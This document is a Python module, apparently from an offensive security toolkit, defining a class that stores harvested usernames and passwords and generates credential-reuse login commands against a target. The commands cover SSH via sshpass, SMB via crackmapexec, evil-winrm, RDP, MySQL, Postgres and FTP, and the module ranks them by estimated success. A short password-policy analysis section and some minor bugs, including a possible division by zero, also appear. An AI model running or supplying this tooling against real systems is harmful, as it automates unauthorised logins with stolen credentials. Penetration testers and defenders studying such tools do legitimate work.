import re
import logging
from typing import List, Dict, Set
from collections import defaultdict

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CredentialEngine:
    def __init__(self):
        self.credentials = []
        self.password_patterns = {
            "weak": r"^(password|admin|123456|qwerty|abc123)$",
            "default": r"^(root|admin|user|test|guest)$",
            "company": r"^[A-Za-z]+202[0-9][!@#]?$",
            "seasonal": r"^(Winter|Spring|Summer|Fall)202[0-9]$"
        }
        self.discovered_creds = defaultdict(list)
    
    def add_credential(self, username: str, password: str, source: str = "manual"):
        """Add discovered credential to database"""
        cred = {
            "user": username,
            "pass": password,
            "source": source,
            "strength": self.assess_strength(password),
            "reused": False
        }
        self.credentials.append(cred)
        self.discovered_creds[username].append(password)
        logger.info(f"Credential added: {username}:{password[:3]}*** from {source}")
        return cred
    
    def assess_strength(self, password: str) -> str:
        """Assess password strength"""
        if len(password) < 8:
            return "Weak"
        if any(char.isdigit() for char in password) and any(char.isalpha() for char in password):
            if any(char in "!@#$%^&*" for char in password):
                return "Strong"
            return "Medium"
        return "Weak"
    
    def reuse_targets(self, target: str, service: str = "ssh") -> List[Dict]:
        """Generate credential reuse attacks against target"""
        attacks = []
        
        for cred in self.credentials:
            attack = {
                "target": target,
                "service": service,
                "username": cred["user"],
                "password": cred["pass"],
                "command": self._generate_command(service, target, cred["user"], cred["pass"]),
                "probability": self._calculate_success_probability(cred)
            }
            attacks.append(attack)
        
        # Sort by probability
        attacks.sort(key=lambda x: x["probability"], reverse=True)
        return attacks
    
    def _generate_command(self, service: str, target: str, user: str, password: str) -> str:
        """Generate specific command for service"""
        commands = {
            "ssh": f"sshpass -p '{password}' ssh {user}@{target}",
            "smb": f"crackmapexec smb {target} -u {user} -p '{password}'",
            "winrm": f"evil-winrm -i {target} -u {user} -p '{password}'",
            "rdp": f"xfreerdp /v:{target} /u:{user} /p:'{password}'",
            "mysql": f"mysql -h {target} -u {user} -p'{password}'",
            "postgres": f"PGPASSWORD='{password}' psql -h {target} -U {user}",
            "ftp": f"ftp -n {target} <<< 'user {user} {password}'"
        }
        return commands.get(service, f"Unknown service: {service}")
    
    def _calculate_success_probability(self, cred: Dict) -> float:
        """Calculate probability of credential success"""
        base_prob = 0.3
        
        if cred["strength"] == "Weak":
            base_prob += 0.3
        if cred["user"] in ["admin", "root", "administrator"]:
            base_prob += 0.2
        if cred["reused"]:
            base_prob += 0.2
            
        return min(base_prob, 0.95)
    
    def find_password_patterns(self, text: str) -> List[str]:
        """Extract potential passwords from text"""
        found = []
        for pattern_name, pattern in self.password_patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                found.extend(matches)
                logger.info(f"Found {pattern_name} pattern: {matches}")
        return found
    
    def analyze_password_policy(self, password_list: List[str]) -> Dict:
        """Analyze password policy from discovered passwords"""
        analysis = {
            "total": len(password_list),
            "average_length": sum(len(p) for p in password_list) / len(password_list) if password_list else 0,
            "has_numbers": sum(1 for p in password_list if any(c.isdigit() for c in p)),
            "has_special": sum(1 for p in password_list if any(c in "!@#$%^&*" for c in p)),
            "common_patterns": {},
            "recommendations": []
        }
        
        # Check for common patterns
        for pattern_name, pattern in self.password_patterns.items():
            matches = [p for p in password_list if re.match(pattern, p, re.IGNORECASE)]
            if matches:
                analysis["common_patterns"][pattern_name] = len(matches)
        
        # Generate recommendations
        if analysis["average_length"] < 8:
            analysis["recommendations"].append("Enforce minimum password length of 12 characters")
        if analysis["has_numbers"] / analysis["total"] < 0.5:
            analysis["recommendations"].append("Require numeric characters in passwords")
        if analysis["has_special"] / analysis["total"] < 0.3:
            analysis["recommendations"].append("Require special characters in passwords")
        
        return analysis
    
    def get_credential_stats(self) -> Dict:
        """Get statistics about discovered credentials"""
        return {
            "total_credentials": len(self.credentials),
            "unique_users": len(set(c["user"] for c in self.credentials)),
            "strength_distribution": {
                "weak": sum(1 for c in self.credentials if c["strength"] == "Weak"),
                "medium": sum(1 for c in self.credentials if c["strength"] == "Medium"),
                "strong": sum(1 for c in self.credentials if c["strength"] == "Strong")
            },
            "top_users": self._get_top_users(),
            "reuse_candidates": [c for c in self.credentials if "admin" in c["user"].lower()]
        }
    
    def _get_top_users(self, limit: int = 5) -> List[Dict]:
        """Get most common usernames"""
        user_counts = defaultdict(int)
        for cred in self.credentials:
            user_counts[cred["user"]] += 1
        
        top_users = sorted(user_counts.items(), key=lambda x: x[1], reverse=True)[:limit]
        return [{"user": user, "count": count} for user, count in top_users]